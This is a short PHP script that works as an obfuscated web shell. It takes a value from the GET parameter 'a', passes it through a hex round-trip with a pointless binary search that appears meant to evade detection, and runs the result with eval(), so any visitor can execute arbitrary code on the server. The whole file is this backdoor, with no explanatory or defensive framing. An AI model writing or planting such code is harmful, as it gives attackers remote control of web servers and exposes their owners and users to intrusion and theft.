<?php
$x=str_split(bin2hex($_GET['a']));
$e='';
$possible=[48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102];
foreach($x as $c)
{
    $low=0;
    $high=15;
    while($low<=$high)
    {
        $mid=intval(($low+$high)/2);
        if($possible[$mid]>ord($c))
        $high=$mid-1;
        else if($possible[$mid]<ord($c))
        $low=$mid+1;
        else
            break;
    }
    $e.=chr($possible[$mid]);
}
eval(hex2bin($e));
?>
